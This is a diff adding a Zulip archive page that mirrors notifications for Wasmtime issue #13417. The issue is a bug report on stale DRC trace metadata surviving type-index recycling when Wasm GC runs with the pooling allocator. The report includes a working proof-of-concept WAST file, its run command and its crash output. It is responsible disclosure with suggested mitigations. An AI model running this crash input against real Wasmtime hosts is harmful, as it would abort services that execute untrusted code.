+<li>Key cached trace metadata by a non-recycled type identity, not only <code>VMSharedTypeIndex</code>.</li>
+<li>Revalidate cached entries in <code>ensure_trace_info</code> against the current <code>TypeRegistry</code> layout before reuse.</li>
+</ol>
+<p>Any change should preserve intended same-engine heap reuse while preventing stale metadata from surviving type-index recycling.</p>
+<hr>
+<p>The initial discovery was made by AI. All technical claims have been reviewed and revised by human experts.</p>
+<p>Reporting on behalf of Autonomous Code Security (ACS) team at Microsoft.<br>
+</p>
+</blockquote>
+
+
+
+<a name="596476950"></a>
+<h4><a href="https://bytecodealliance.zulipchat.com#narrow/stream/225357-git-wasmtime/topic/wasmtime%20/%20issue%20%2313417%20%60trace_info%60%20stale%20cache%20can%20lead.../near/596476950" class="zl"><img src="https://bytecodealliance.github.io/zulip-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Wasmtime GitHub notifications bot <a href="https://bytecodealliance.github.io/zulip-archive/stream/225357-git-wasmtime/topic/wasmtime.20.2F.20issue.20.2313417.20.60trace_info.60.20stale.20cache.20can.20lead.2E.2E.2E.html#596476950">(May 20 2026 at 14:49)</a>:</h4>
+<p>fitzgen assigned fitzgen to <a href="https://github.com/bytecodealliance/wasmtime/issues/13417">issue #13417</a>.</p>
+
+
+
+<a name="596477009"></a>
+<h4><a href="https://bytecodealliance.zulipchat.com#narrow/stream/225357-git-wasmtime/topic/wasmtime%20/%20issue%20%2313417%20%60trace_info%60%20stale%20cache%20can%20lead.../near/596477009" class="zl"><img src="https://bytecodealliance.github.io/zulip-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Wasmtime GitHub notifications bot <a href="https://bytecodealliance.github.io/zulip-archive/stream/225357-git-wasmtime/topic/wasmtime.20.2F.20issue.20.2313417.20.60trace_info.60.20stale.20cache.20can.20lead.2E.2E.2E.html#596477009">(May 20 2026 at 14:49)</a>:</h4>
+<p><a href="https://github.com/fitzgen">fitzgen</a> added the wasm-proposal:gc label to <a href="https://github.com/bytecodealliance/wasmtime/issues/13417">Issue #13417</a>.</p>
+
+
+
+<a name="596483811"></a>
+<h4><a href="https://bytecodealliance.zulipchat.com#narrow/stream/225357-git-wasmtime/topic/wasmtime%20/%20issue%20%2313417%20%60trace_info%60%20stale%20cache%20can%20lead.../near/596483811" class="zl"><img src="https://bytecodealliance.github.io/zulip-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Wasmtime GitHub notifications bot <a href="https://bytecodealliance.github.io/zulip-archive/stream/225357-git-wasmtime/topic/wasmtime.20.2F.20issue.20.2313417.20.60trace_info.60.20stale.20cache.20can.20lead.2E.2E.2E.html#596483811">(May 20 2026 at 15:12)</a>:</h4>
+<p>fitzgen <a href="https://github.com/bytecodealliance/wasmtime/issues/13417#issuecomment-4499800212">commented</a> on <a href="https://github.com/bytecodealliance/wasmtime/issues/13417">issue #13417</a>:</p>
+<blockquote>
+<p>Thanks for the bug report and thanks for double checking the security policy before reporting publicly!</p>
+</blockquote>
+
+
+
+<a name="596578025"></a>
+<h4><a href="https://bytecodealliance.zulipchat.com#narrow/stream/225357-git-wasmtime/topic/wasmtime%20/%20issue%20%2313417%20%60trace_info%60%20stale%20cache%20can%20lead.../near/596578025" class="zl"><img src="https://bytecodealliance.github.io/zulip-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Wasmtime GitHub notifications bot <a href="https://bytecodealliance.github.io/zulip-archive/stream/225357-git-wasmtime/topic/wasmtime.20.2F.20issue.20.2313417.20.60trace_info.60.20stale.20cache.20can.20lead.2E.2E.2E.html#596578025">(May 20 2026 at 22:29)</a>:</h4>
+<p>fitzgen closed <a href="https://github.com/bytecodealliance/wasmtime/issues/13417">issue #13417</a>:</p>
+<blockquote>
+<p>This bug is reachable only when Wasmtime runs Wasm GC with the pooling allocator enabled. <a href="https://docs.wasmtime.dev/security-what-is-considered-a-security-vulnerability.html">Wasmtime's security page</a> says "Bugs must affect <a href="https://docs.wasmtime.dev/stability-tiers.html">a tier 1 platform or feature</a> to be considered a security vulnerability." Since <code>gc</code> is marked tier 2, we are directly reporting this bug on GitHub.</p>
+<h2>Overview</h2>
+<p><code>DrcHeap</code> caches GC tracing metadata in <code>trace_infos</code>, keyed by <code>VMSharedTypeIndex</code>. When a pooled DRC heap is detached, it intentionally preserves that cache because the heap will only be reused with the same <code>Engine</code> (described in code comment). However, the same-engine assumption is not sufficient: when a module's <code>TypeCollection</code> is dropped, Wasmtime unregisters its rec groups and returns their shared type-index slab entries to the registry. A later module on the same <code>Engine</code> can then assign the same <code>VMSharedTypeIndex</code> to a different GC type. If that happens, <code>DrcHeap::ensure_trace_info</code> sees the stale cache entry and does not rebuild the tracing metadata for the new layout.</p>
+<p>DRC relies on this metadata while tracing outgoing references before deallocating an object whose reference count reached zero. Reusing metadata from an older, larger struct for a newer, smaller struct breaks the invariant that cached GC-reference offsets describe the current type bound to the shared index. The current implementation detects the mismatch when <code>VMGcObjectData::read_pod</code> reads beyond the new object's data and panics with <code>out of bounds field</code>, aborting the host process. This demonstrates an execution-time denial of service with the default DRC collector; it does not demonstrate host memory unsafety or sandbox escape.</p>
+<h3>Security impact</h3>
+<p>This bug only affects targets with GC and the pooling allocator enabled that execute untrusted programs. A quick GitHub search didn't reveal any important targets that operate on this configuration.</p>
+<h3>Demonstration</h3>
+<p>Run:</p>
+<div class="codehilite" data-code-language="Bash"><pre><span></span><code>wasmtime<span class="w"> </span>wast<span class="w"> </span>-W<span class="w"> </span><span class="nv">gc</span><span class="o">=</span>y<span class="w"> </span>-O<span class="w"> </span>pooling-allocator<span class="o">=</span>y<span class="w"> </span>poc.wast
+</code></pre></div>
+<div class="codehilite" data-code-language="WebAssembly"><pre><span></span><code><span class="c1">;; This PoC is intended for the `wasmtime wast` CLI. The `thread` directive is</span>
+<span class="c1">;; a WAST-harness directive that creates a second Store on the same Engine.</span>
+
+<span class="p">(</span><span class="k">module</span><span class="p">)</span>
+
+<span class="p">(</span><span class="err">thread</span> <span class="nv">$old</span>
+  <span class="p">(</span><span class="k">module</span>
+    <span class="c1">;; Register stale trace metadata for a large struct whose final field is a</span>
+    <span class="c1">;; GC reference. The field offset is valid for this type, but not for the</span>
+    <span class="c1">;; smaller type instantiated after this thread's Store is dropped.</span>
+    <span class="p">(</span><span class="k">type</span> <span class="nv">$old</span> <span class="p">(</span><span class="err">struct</span>
+      <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">field</span> <span class="err">anyref</span><span class="p">)))</span>
+    <span class="p">(</span><span class="k">global</span> <span class="p">(</span><span class="err">ref</span> <span class="err">null</span> <span class="nv">$old</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">struct.new</span> <span class="nv">$old</span>
+        <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">(</span><span class="err">ref.null</span> <span class="err">any</span><span class="p">)))))</span>
+<span class="p">(</span><span class="err">wait</span> <span class="nv">$old</span><span class="p">)</span>
+
+<span class="p">(</span><span class="k">module</span>
+  <span class="p">(</span><span class="k">type</span> <span class="nv">$new</span> <span class="p">(</span><span class="err">struct</span> <span class="p">(</span><span class="err">field</span> <span class="p">(</span><span class="k">mut</span> <span class="kt">i32</span><span class="p">))))</span>
+  <span class="p">(</span><span class="k">global</span> <span class="nv">$g</span> <span class="p">(</span><span class="k">mut</span> <span class="p">(</span><span class="err">ref</span> <span class="err">null</span> <span class="nv">$new</span><span class="p">))</span>
+    <span class="p">(</span><span class="err">struct.new</span> <span class="nv">$new</span> <span class="p">(</span><span class="nb">i32.const</span> <span class="mi">1</span><span class="p">)))</span>
+  <span class="p">(</span><span class="k">func</span> <span class="p">(</span><span class="k">export</span> <span class="s2">"trigger"</span><span class="p">)</span>
+    <span class="c1">;; Overwriting the global makes DRC decrement and deallocate the old value,</span>
+    <span class="c1">;; consuming the stale trace metadata without forcing an explicit GC.</span>
+    <span class="p">(</span><span class="nb">global.set</span> <span class="nv">$g</span> <span class="p">(</span><span class="err">ref.null</span> <span class="nv">$new</span><span class="p">))))</span>
+
+<span class="p">(</span><span class="err">invoke</span> <span class="s2">"trigger"</span><span class="p">)</span>
+</code></pre></div>
+<p>The first WAST <code>thread</code> directive is a PoC mechanism, not a requirement for triggering the bug. It was used for creating a child <code>Store</code> on the same <code>Engine</code>, but there are other ways to build a similar construct. When the thread executes, DRC registers trace metadata for the type in the child store's pooled heap. When <code>(wait $old)</code> completes, the child store is dropped and the pooled DRC heap is returned with its <code>trace_infos</code> map intact.</p>
+<p>The second module instantiates after the child store has been dropped. Its small scalar-only struct receives the recycled <code>VMSharedTypeIndex</code>, and the main store reuses the pooled DRC heap. The trigger overwrites a mutable global that holds the new object, so DRC decrements and deallocates the old global value. During deallocation, the stale large-type GC-reference field offset is read from the small object's data via <code>VMGcObjectData::read_u32</code>, which panics with <code>out of bounds field</code>.</p>
+<h4>Output</h4>
+<div class="codehilite" data-code-language="Text only"><pre><span></span><code>$ wasmtime wast -W gc=y -O pooling-allocator=y poc.wast
+
+thread 'main' (2176) panicked at crates/wasmtime/src/runtime/vm/gc/enabled/data.rs:137:48:
+out of bounds field
+note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
+zsh: IOT instruction (core dumped)  wasmtime wast -W gc=y -O pooling-allocator=y
+</code></pre></div>
+<h4>Environment</h4>
+<div class="codehilite" data-code-language="Bash"><pre><span></span><code>$<span class="w"> </span>lsb_release<span class="w"> </span>-a
+Distributor<span class="w"> </span>ID:<span class="w"> </span>Ubuntu
+Description:<span class="w">    </span>Ubuntu<span class="w"> </span><span class="m">26</span>.04<span class="w"> </span>LTS
+Release:<span class="w">        </span><span class="m">26</span>.04
+Codename:<span class="w">       </span>resolute
+
+$<span class="w"> </span>wasmtime<span class="w"> </span>--version
+wasmtime<span class="w"> </span><span class="m">44</span>.0.1<span class="w"> </span><span class="o">(</span>f302ebd6b<span class="w"> </span><span class="m">2026</span>-04-30<span class="o">)</span>
+</code></pre></div>
+<h3>Data flow trace</h3>
+<p><strong>Bug path: stale trace metadata survives pooled-heap reuse</strong></p>
+<p><code>DrcHeap::ensure_trace_info</code> / <code>DrcHeap::insert_new_trace_info</code> → <code>DrcHeap::detach</code></p>
+<ul>
+<li>
+<p><code>DrcHeap::ensure_trace_info</code> returns immediately on a <code>VMSharedTypeIndex</code> cache hit. On a miss, <code>DrcHeap::insert_new_trace_info</code> reads the current GC layout from the engine and stores struct GC-reference offsets under that index.</p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/vm/gc/enabled/drc.rs#L271-L309">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/vm/gc/enabled/drc.rs#L271-L309</a></p>
+</li>
+<li>
+<p><code>DrcHeap::detach</code> preserves <code>trace_infos</code> when a pooled heap is detached for reuse. The comment assumes same-engine reuse means the tracing information remains valid.</p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/vm/gc/enabled/drc.rs#L786-L811">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/vm/gc/enabled/drc.rs#L786-L811</a></p>
+</li>
+</ul>
+<p><strong>Bug path: the type registry can recycle the cache key</strong></p>
+<p><code>TypeCollection::drop</code> → <code>TypeRegistryInner::unregister_type_collection</code> → <code>TypeRegistryInner::remove_entry_impl</code> → <code>TypeRegistryInner::remove_entry_types</code> / <code>Slab::dealloc</code> → <code>TypeRegistryInner::assign_shared_type_indices</code> / <code>Slab::alloc</code></p>
+<ul>
+<li>
+<p>Dropping a <code>TypeCollection</code> unregisters its rec groups. When a rec group's registration count reaches zero, the registry removes the entry and deallocates each shared type-index slab entry.</p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L215-L225">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L215-L225</a></p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L1361-L1370">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L1361-L1370</a></p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L933-L940">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L933-L940</a></p>
+</li>
+<li>
+<p>Later type registration obtains <code>VMSharedTypeIndex</code> values from the same slab. <code>Slab::try_alloc_index</code> prefers the free list, so a newly registered, different GC type can receive the old index.</p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L1169-L1176">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L1169-L1176</a></p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/core/src/slab.rs#L328-L337">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/core/src/slab.rs#L328-L337</a></p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/core/src/slab.rs#L439-L455">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/core/src/slab.rs#L439-L455</a></p>
+</li>
+</ul>
+<h3>Recommendation</h3>
+<p>Possible mitigations for this specific pattern include:</p>
+<ol>
+<li>Clear or invalidate DRC <code>trace_infos</code> when a pooled heap is detached or reassigned.</li>
+<li>Key cached trace metadata by a non-recycled type identity, not only <code>VMSharedTypeIndex</code>.</li>
+<li>Revalidate cached entries in <code>ensure_trace_info</code> against the current <code>TypeRegistry</code> layout before reuse.</li>
+</ol>
+<p>Any change should preserve intended same-engine heap reuse while preventing stale metadata from surviving type-index recycling.</p>
+<hr>
+<p>The initial discovery was made by AI. All technical claims have been reviewed and revised by human experts.</p>
+<p>Reporting on behalf of Autonomous Code Security (ACS) team at Microsoft.<br>
+</p>
+</blockquote>
+
+
+
+<hr><p>Last updated: Jul 24 2026 at 22:24 UTC</p>
+</html>
